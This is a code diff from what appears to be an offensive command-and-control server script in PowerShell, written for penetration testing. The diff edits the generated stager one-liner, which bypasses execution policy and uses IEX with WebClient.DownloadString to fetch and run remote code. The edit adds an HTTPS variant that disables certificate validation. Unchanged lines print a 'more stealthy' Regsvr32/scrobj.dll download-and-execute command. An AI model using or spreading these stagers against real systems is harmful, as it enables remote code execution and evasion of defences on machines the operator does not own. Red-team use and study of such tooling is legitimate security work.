@@ -855,7 +855,12 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     $enablesound = ($enablesound,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
-    $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    if ($ipv4address.Contains("https")) {
+        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    } else {
+        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+""     
+    }
+
     $httpresponse = '
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -957,6 +962,7 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
         
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
+
     write-host $shortcut `n -ForegroundColor green
     Write-Host "For a more stealthy approach, use SubTee's Regsvr32 or Mshta:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
